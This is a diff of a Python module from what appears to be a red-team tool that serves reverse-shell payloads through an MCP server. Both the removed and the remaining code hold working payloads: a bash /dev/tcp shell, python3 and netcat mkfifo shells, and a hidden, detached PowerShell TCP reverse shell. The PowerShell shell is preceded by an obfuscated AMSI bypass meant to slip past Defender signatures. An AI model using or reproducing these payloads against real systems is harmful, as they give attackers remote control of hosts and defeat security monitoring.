@@ -128,50 +128,23 @@ def _ip_from_interface(iface: str) -> str | None:
     return None
 
 
-def _linux_payloads(ip: str, port: int) -> list[dict]:
-    """Generate reverse shell payloads for Linux targets."""
-    return [
-        {
-            "name": "bash /dev/tcp",
-            "note": "Works on most Linux — bash built-in, no dependencies",
-            "payload": f"bash -i >& /dev/tcp/{ip}/{port} 0>&1",
-        },
-        {
-            "name": "python3",
-            "note": "Fallback when bash /dev/tcp is unavailable",
-            "payload": (
-                f"python3 -c 'import socket,subprocess,os;"
-                f"s=socket.socket();s.connect((\"{ip}\",{port}));"
-                f"os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);"
-                f"os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
-            ),
-        },
-        {
-            "name": "mkfifo (nc/ncat)",
-            "note": "Uses netcat — works even with restricted bash",
-            "payload": (
-                f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|"
-                f"nc {ip} {port} >/tmp/f"
-            ),
-        },
-    ]
+def _linux_payload(ip: str, port: int) -> str:
+    """One-liner bash reverse shell for Linux targets."""
+    return f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"
 
 
-def _windows_payloads(ip: str, port: int) -> list[dict]:
-    """Generate reverse shell payloads for Windows targets.
+def _windows_payload(ip: str, port: int) -> str:
+    """Detached PowerShell reverse shell with AMSI bypass for Windows targets.
 
-    Includes AMSI bypass for CTF-level Defender evasion.  Signatured
-    strings are split via concatenation and [char] casts so the bypass
-    itself isn't flagged.
+    AMSI bypass patches amsiInitFailed via split strings + [char] casts.
+    Start-Process detaches from parent so shell survives xp_cmdshell/cmd /c exit.
     """
-    # AMSI bypass — amsiInitFailed via split strings + [char] casts
     amsi = (
         "$a=[Ref].Assembly.GetType("
         "'System.Management.Automation.'+[char]65+'msi'+[char]85+'tils');"
         "$b=$a.GetField('a'+'msiI'+'nitF'+'ailed','NonPublic,Static');"
         "$b.SetValue($null,$true)"
     )
-    # PowerShell reverse shell — TCPClient, no Invoke-Expression signatures
     ps_shell = (
         f"$c=New-Object Net.Sockets.TCPClient('{ip}',{port});"
         "$s=$c.GetStream();[byte[]]$b=0..65535|%{0};"
@@ -180,26 +153,12 @@ def _windows_payloads(ip: str, port: int) -> list[dict]:
         "$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';"
         "$sb=([Text.Encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length)}"
     )
-    # Combined: AMSI bypass then shell
     combined = f"{amsi};{ps_shell}"
-    # Detached variant — Start-Process so the shell survives parent exit
-    # (xp_cmdshell, cmd /c, scheduled tasks all kill children on exit)
     detached = (
         f"Start-Process -WindowStyle Hidden powershell -ArgumentList "
         f"'-c {combined}'"
     )
-    return [
-        {
-            "name": "PowerShell detached (AMSI bypass + TCP)",
-            "note": "Survives parent exit (xp_cmdshell, cmd /c). Use this by default.",
-            "payload": f"powershell -c \"{detached}\"",
-        },
-        {
-            "name": "PowerShell inline (AMSI bypass + TCP)",
-            "note": "Direct execution — use when you have a persistent shell (evil-winrm, interactive cmd).",
-            "payload": f"powershell -c \"{combined}\"",
-        },
-    ]
+    return f"powershell -c \"{detached}\""
 
 # Privileged Docker mode
 SHELL_DOCKER_IMAGE = os.environ.get("SHELL_DOCKER_IMAGE", "red-run-shell:latest")
@@ -644,8 +603,8 @@ def create_server() -> FastMCP:
                     f"Listener will timeout after {timeout}s if no connection arrives."
                 ),
                 "payloads": {
-                    "linux": _linux_payloads(callback_ip, port),
-                    "windows": _windows_payloads(callback_ip, port),
+                    "linux": _linux_payload(callback_ip, port),
+                    "windows": _windows_payload(callback_ip, port),
                 },
             },
             indent=2,
